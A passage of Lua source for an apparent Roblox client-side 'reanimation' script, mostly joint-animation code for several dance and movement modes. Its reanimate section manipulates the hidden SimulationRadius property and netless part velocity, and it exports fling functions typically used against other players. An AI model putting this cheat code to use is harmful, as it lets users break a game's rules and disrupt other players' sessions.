		camcf=cf(pos,pos+camoff.LookVector)+camoff.LookVector*camoff.Z+v3_0150
		if shiftlock and not firstperson then
			camcf=camcf+camcf.RightVector*1.75
		end
		if cam then
			cam.CFrame=camcf
		end

		if onground then
			if xzvel==v3_0 then
				pose="idle"
			else
				pose="walk"
			end
		elseif Yvel>0 then
			pose="jump"
		else
			pose="fall"
		end
		local lerpfunc=modes[mode][pose]
		lerpfunc=lerpfunc or modes.default[pose]
		if lerpfunc then
			lerpfunc()
		end
		
		cframes[rootpart]=cfr
		refreshjoints(rootpart)

		if abs(Yvel)>1 then
			noYvelTime=0
		else
			noYvelTime=clamp(noYvelTime+delta*0.3,0,1)
			xzvel=xzvel*(1-noYvelTime)
		end

		local idlerv=v3(sin((sine-0.0375)*16),sin(sine*16),sin((sine+0.075)*16))
		local idleoff=idlerv*0.001
		
		for i,v in pairs(cframes) do
			local p=i.placeholder
			if p then
				if p.Parent~=ws then
					p.Parent=ws
				end
				p.CFrame=v
			end
		end
		for i,v in pairs(cframes1) do
			if (not i.Anchored) and i:IsDescendantOf(ws) then
				if i.ReceiveAge==0 then
					local p=v.placeholder
					if p and p.Parent then
						p.Parent=nil
					end
					v=cframes[v]
					local lastpos=lastpositions[i]
					local vel=(v.Position-lastpos)/delta
					if vel.Magnitude>speedlimit then
						vel=vel.Unit*speedlimit
						v=v+(lastpos+vel*delta)-v.Position
					end
					lastpositions[i]=v.Position
					if vel.Magnitude<0.15 then
						v=v+idleoff
					end
					if novoid and (v.Y<novoid) then
						v=v+v3_010*(novoid-v.Y)
					end
					i.Velocity=getNetlessVelocity(vel*noYvelTime+xzvel)
					i.CFrame=v
					i.RotVelocity=idlerv
				else
					lastpositions[i]=i.Position
				end
			end
		end

		if simrad then
			shp(lp,"SimulationRadius",simrad)
		end
	end

	con=heartbeat:Connect(mainFunction)
	mainFunction()
	
	stopreanimate=function()
		if c then
			c=nil
			return true
		else
			return false
		end
	end
	
	local legcfR=cf(1,-1,0)
	local legcfL=cf(-1,-1,0)
	local raydir=v3_010*-2
	local function raycastlegs() --this returns 2 values: right leg raycast offset, left leg raycast offset
		local rY=ws:Raycast((cfr*legcfR).Position,raydir,raycastparams)
		local lY=ws:Raycast((cfr*legcfL).Position,raydir,raycastparams)
		return rY and (rY.Position.Y-(pos.Y-3)) or 0,lY and (lY.Position.Y-(pos.Y-3)) or 0
	end

	local function velbycfrvec() --this returns 2 values: forward/backwards movement (from -1 to 1), right/left movement (from -1 to 1)
		local fw=cfr.LookVector*xzvel/walkSpeed
		local rt=cfr.RightVector*xzvel/walkSpeed
		return fw.X+fw.Z,rt.X+rt.Z
	end

	local lastvel=v3_0
	local velchg1=v3_0
	local function velchgbycfrvec() --this returns 2 values: forward/backwards velocity change, right/left velocity change
		velchg1=velchg1+(lastvel-xzvel) --i recommend setting velchg1 to v3_0 when u start using this function or it will look worse
		lastvel=xzvel
		velchg1=velchg1:Lerp(v3_0,deltaTime/2)
		local fw=cfr.LookVector*velchg1/32
		local rt=cfr.RightVector*velchg1/32
		return fw.X+fw.Z,rt.X+rt.Z
	end

	local function rotToMouse(alpha) --this rotates ur character towards your mouse hit position
		local mpos=mouse.Hit.Position
		cfr=cfr:Lerp(cf(pos,v3(mpos.X,pos.Y,mpos.Z)),alpha or deltaTime)
	end

	local function setWalkSpeed(n)
		if type(n) ~= "number" then
			n=16
		end
		walkSpeed=n
	end
	local function setJumpPower(n)
		if type(n) ~= "number" then
			n=50
		end
		jumpPower=n
	end
	local function setGravity(n)
		if type(n) ~= "number" then
			n=196.2
		end
		gravity=n
	end

	return {
		cframes=cframes,
		joints=joints,
		fling=fling,
		predictionfling=predictionfling,
		refreshjoints=refreshjoints,
		raycastlegs=raycastlegs,
		velbycfrvec=velbycfrvec,
		velchgbycfrvec=velchgbycfrvec,
		addmode=addmode,
		getPart=getPart,
		getPartFromMesh=getPartFromMesh,
		getJoint=getJoint,
		getPartJoint=getPartJoint,
		rotToMouse=rotToMouse,
		setWalkSpeed=setWalkSpeed,
		setJumpPower=setJumpPower,
		setGravity=setGravity
	}
end
btn("Calamity Glitcher V1", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local raycastlegs=t.raycastlegs
	local velbycfrvec=t.velbycfrvec
	local velchgbycfrvec=t.velchgbycfrvec
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")

	addmode("default", {
		idle = function()
			local rY, lY = raycastlegs()

			local Cfw, Crt = velchgbycfrvec()

RightShoulder.C0=RightShoulder.C0:Lerp(cf(1.2+0.2*sin(sine*2),0.2 * sin((sine+20)*2),0)*angles(-0.7853981633974483,-0.3490658503988659+0.17453292519943295*sin((sine+10)*2),-0.7853981633974483+0.17453292519943295*sin((sine+15)*2)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1.2+0.3*sin((sine + 15)*2.5),0.1 * sin((sine+15)*1.3))*angles(-0.3490658503988659+0.7853981633974483*sin((sine+10)*1.5),1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,4+2*sin((sine + 15)*1.5),0)*angles(-1.5707963267948966+0.4363323129985824*sin((sine+10)*1.8),0,2.792526803190927+0.4363323129985824*sin(sine*1.5)),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5+0.2*sin(sine*2),0.5 * sin((sine+10)*2))*angles(3.141592653589793+0.2617993877991494*sin(sine*2.5),-1.7453292519943295+0.3490658503988659*sin(sine*2.5),0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966+0.3490658503988659*sin(sine*2.5),0,3.141592653589793+0.3490658503988659*sin((sine+10)*2)),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.3+0.5*sin((sine + 15)*2.5),-1+0.1*sin((sine + 10)*1.3))*angles(0.4363323129985824*sin((sine+5)*1.5),-1.5707963267948966+0.17453292519943295*sin((sine+10)*1.5),0),deltaTime) 
		end,
		walk = function()
			local Vfw, Vrt = velbycfrvec()

			local rY, lY = raycastlegs()

			local Cfw, Crt = velchgbycfrvec()

RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.7853981633974483+0.17453292519943295*sin((sine+10)*50),1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,4+1*sin((sine + 5)*1.5),0)*angles(-2.2689280275926285+0.17453292519943295*sin((sine+10)*1.5),0,3.141592653589793),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0.2)*angles(-1.0471975511965976+0.17453292519943295*sin((sine+5)*1.5),0.17453292519943295*sin(sine*1.5),3.141592653589793+0.3490658503988659*sin((sine+10)*1)),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(-0.7853981633974483+0.17453292519943295*sin((sine+5)*50),-1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-0.8726646259971648+0.17453292519943295*sin((sine+5)*1.5),1.5707963267948966+0.17453292519943295*sin((sine+10)*1.5),0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-0.8726646259971648+0.17453292519943295*sin((sine+10)*1.5),-1.5707963267948966+0.17453292519943295*sin((sine+5)*1.5),0),deltaTime) 
		end,
		jump = function()
			local Vfw, Vrt = velbycfrvec()

			local Cfw, Crt = velchgbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.4835298641951802 + Vfw * 0.1 - Cfw, Vrt * -0.05 + Crt, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3962634015954636, 0, -3.141592653589793 - Vrt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-85,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-80,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end,
		fall = function()
			local Vfw, Vrt = velbycfrvec()

			local Cfw, Crt = velchgbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.6580627893946132 + Vfw * 0.1 - Cfw, Vrt * -0.05 + Crt, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.7453292519943295, 0, -3.141592653589793 - Vrt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-95,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-100,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end
	})

	addmode("q", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.7,-0.4)*angles(-0.3490658503988659+0.3490658503988659*sin((sine+5)*1),-1.5707963267948966,0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1+0.1*sin((sine + 5)*1),0.5+0.3*sin((sine + 10)*1),0)*angles(2.2689280275926285,-1.7453292519943295+0.5235987755982988*sin((sine+10)*1),0.2617993877991494*sin(sine*1)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-0.3+0.2*sin((sine + 20)*1.5),-0.7)*angles(0.17453292519943295+0.3490658503988659*sin((sine+15)*1),1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,4+1*sin((sine + 15)*1),0)*angles(-0.6981317007977318,0,2.6179938779914944+0.3490658503988659*sin(sine*1)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1.1,-0.2+0.1*sin(sine*1.8))*angles(-2.0943951023931953+0.3490658503988659*sin((sine+10)*1.5),0.17453292519943295*sin((sine+5)*1),2.443460952792061+0.17453292519943295*sin((sine+15)*1)),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(0,0.7853981633974483+0.017453292519943295*sin(sine*1),-0.7853981633974483+0.17453292519943295*sin(sine*1)),deltaTime) 
		end
	})
	addmode("e", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

            RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.2*sin((sine + 10)*1.5),0)*angles(-0.3490658503988659-0.08726646259971647*sin(sine*1.5),1.5707963267948966,0),deltaTime) 
            Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
            LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.2*sin((sine + 10)*1.5),0)*angles(-0.17453292519943295-0.08726646259971647*sin(sine*1.5),-0.7853981633974483,0),deltaTime) 
            LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.2+0.2*sin(sine*1),0)*angles(0,-3.141592653589793+0.17453292519943295*sin(sine*1),-1.7453292519943295+0.08726646259971647*sin((sine+10)*1.5)),deltaTime) 
            RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.2 * sin((sine+10)*1.5),0)*angles(-1.3962634015954636+0.08726646259971647*sin(sine*1.5),0,3.141592653589793),deltaTime) 
            RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.2+0.2*sin(sine*1),0)*angles(0,3.141592653589793,1.3962634015954636-0.08726646259971647*sin((sine+10)*1.5)),deltaTime)
 		end,
			walk = function()
			local Vfw, Vrt = velbycfrvec()

			local Cfw, Crt = velchgbycfrvec()

        Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966+0.17453292519943295*sin(sine*8),0,3.141592653589793),deltaTime) 
        RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.15*sin(sine*8),0)*angles(-0.5235987755982988*sin((sine+5)*10),1.5707963267948966+0.17453292519943295*sin(sine*10),0),deltaTime) 
        RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.15 * sin(sine*8),0)*angles(-1.5707963267948966+0.08726646259971647*sin((sine+5)*8),0,3.141592653589793),deltaTime) 
        RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-0.6981317007977318*sin(sine*8),1.5707963267948966+0.17453292519943295*sin((sine+10)*8),0),deltaTime) 
        LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(0.6981317007977318*sin(sine*8),-1.5707963267948966+0.17453292519943295*sin((sine+10)*8),0),deltaTime) 
        LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.15*sin(sine*8),0)*angles(0.5235987755982988*sin((sine+5)*10),-1.5707963267948966+0.17453292519943295*sin(sine*10),0),deltaTime) 
		end
	})
	addmode("r", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()
RootJoint.C0=RootJoint.C0:Lerp(cf(1 * sin((sine+2)*1.35),7+1*sin(sine*1.35),1 * sin((sine+2)*1))*angles(-1.3962634015954636+0.4363323129985824*sin((sine-2)*1.35),-0.2617993877991494,3.141592653589793+0.2617993877991494*sin(sine*1.35)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-1.0471975511965976-0.4363323129985824*sin(sine*1.35),1.2217304763960306,0.5235987755982988),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.25 * sin(sine*1.35),0)*angles(0,0.7853981633974483+0.2617993877991494*sin((sine+2)*1.35),0.7853981633974483+0.2617993877991494*sin(sine*1.35)),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.75 * sin((sine+2)*1.35),-0.75)*angles(-0.6108652381980153+0.4363323129985824*sin((sine-2)*1.35),-1.0471975511965976,-0.6108652381980153),deltaTime)  
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.25 * sin(sine*1.35),-0.35)*angles(0,-0.7853981633974483+0.4363323129985824*sin((sine+2)*1.35),-0.7853981633974483),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.7453292519943295-0.4363323129985824*sin((sine-2)*1.35),0.2617993877991494,3.490658503988659-0.2617993877991494*sin(sine*1.35)),deltaTime) 
		end
	})         
	addmode("t", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()--

LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.3+0.2*sin(sine*1.2),0)*angles(0.3490658503988659*sin((sine+5)*1.2),-2.9670597283903604,-1.7453292519943295+0.3490658503988659*sin(sine*1)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.3490658503988659*sin(sine*1),1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,4+2*sin((sine + 5)*1),2 * sin((sine+5)*1))*angles(-1.7453292519943295+0.3490658503988659*sin((sine+10)*1),0,3.141592653589793),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966+0.17453292519943295*sin((sine+10)*1.2),0,3.141592653589793),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-0.3490658503988659+0.17453292519943295*sin(sine*1),1.0471975511965976,0.3490658503988659),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.3+0.2*sin(sine*1.1),-0.7)*angles(0,-1.5707963267948966,0),deltaTime) 
		end
	})
	addmode("y", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-0.5235987755982988+0.17453292519943295*sin((sine+10)*2),-1.0471975511965976,-0.5235987755982988+0.17453292519943295*sin((sine+10)*2)),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-0.5235987755982988+0.17453292519943295*sin((sine+10)*2),1.0471975511965976,0.5235987755982988-0.17453292519943295*sin((sine+10)*2)),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,1.5+0.5*sin(sine*2),0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.2+0.2*sin(sine*1.5),-0.7)*angles(0,-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1.1+0.1*sin((sine + 10)*2),0)*angles(0.08726646259971647*sin(sine*2),1.5707963267948966,0),deltaTime) 
		end
	})        
end)


btn("M80-Parkour", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local raycastlegs=t.raycastlegs
	local velbycfrvec=t.velbycfrvec
	local velchgbycfrvec=t.velchgbycfrvec
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	
    t.setWalkSpeed(30)
    t.setJumpPower(75)
    
    addmode("default", {
		idle = function()
			local rY, lY = raycastlegs()
        LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.1*sin(sine*1.5),0)*angles(0.17453292519943295,-1.5707963267948966,0),deltaTime) 
        RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.1 * sin(sine*1.5),0)*angles(-1.7453292519943295,0,3.141592653589793),deltaTime) 
        LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.7,0.2+0.1*sin(sine*1.2),0)*angles(-0.2617993877991494,-0.4363323129985824,0.6108652381980153+0.08726646259971647*sin(sine*1.3)),deltaTime) 
        RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5+0.1*sin(sine*1.2),0)*angles(0.2617993877991494,0.4363323129985824,-0.6108652381980153-0.08726646259971647*sin(sine*1.3)),deltaTime) 
        Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.9198621771937625+0.17453292519943295*sin(sine*1.2),0,3.141592653589793),deltaTime) 
        RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.1*sin(sine*1.5),0)*angles(0.17453292519943295,1.5707963267948966,0),deltaTime) 
		end,
		walk = function()
			local fw, rt = velbycfrvec()

LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.2*sin(sine*13),0)*angles(1.5707963267948966*sin((sine+10)*13),-1.5707963267948966+0.4363323129985824*sin((sine+5)*10),0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.2 * sin(sine*13),0)*angles(-1.7453292519943295+0.17453292519943295*sin((sine+10)*13),0,3.141592653589793),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.3962634015954636+0.13962634015954636*sin(sine*13),-0.08726646259971647,3.3161255787892263+0.17453292519943295*sin(sine*1)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.2*sin(sine*13),0)*angles(-1.5707963267948966*sin((sine+10)*13),1.5707963267948966-0.4363323129985824*sin((sine+5)*10),0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(1.5707963267948966*sin((sine+10)*13),1.5707963267948966+0.2617993877991494*sin((sine+10)*10),0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-1.5707963267948966*sin((sine+10)*13),-1.5707963267948966,0),deltaTime) 
         		end,
		jump = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.4835298641951802 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3962634015954636, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-85,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-80,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end,
		fall = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.6580627893946132 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.7453292519943295, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-95,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-100,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end
	})
end)


btn("Krystal Dance", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local raycastlegs=t.raycastlegs
	local velbycfrvec=t.velbycfrvec
	local velchgbycfrvec=t.velchgbycfrvec
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	addmode("default", {
		idle = function()
			local rY, lY = raycastlegs()
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.35-0.15*sin((sine + 2)*1.65),0)*angles(-0.6108652381980153*sin((sine+6)*1.65),-1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.35-0.15*sin((sine + 2)*1.65),0)*angles(-0.6108652381980153*sin((sine+6)*1.65),1.5707963267948966,0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.15*sin(sine*1.65),0.1 * sin(sine*1.65))*angles(0.5235987755982988-0.08726646259971647*sin(sine*1.65),-1.7453292519943295,0.5235987755982988),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.15 * sin(sine*1.65),0)*angles(-1.5707963267948966+0.08726646259971647*sin(sine*1.65),0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.15*sin(sine*1.65),0.1 * sin(sine*1.65))*angles(0.5235987755982988-0.08726646259971647*sin(sine*1.65),1.7453292519943295,-0.5235987755982988),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966-0.17453292519943295*sin((sine+2)*1.65),0,3.141592653589793),deltaTime)
 		end,
		walk = function()
			local fw, rt = velbycfrvec()

			local rY, lY = raycastlegs()

                t.setWalkSpeed(11.5)
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-0.15+0.025*sin((sine - 2)*4),0)*angles(-1.3962634015954636,0,3.141592653589793+0.2617993877991494*sin(sine*4)),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0.35 * sin((sine-2)*4))*angles(-0.6108652381980153*sin((sine+6)*4),-1.5707963267948966+0.4363323129985824*sin(sine*4),0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.35*sin((sine + 6)*4),-0.35 * sin(sine*4))*angles(0.7853981633974483*sin(sine*4),-1.3962634015954636,0),deltaTime) 
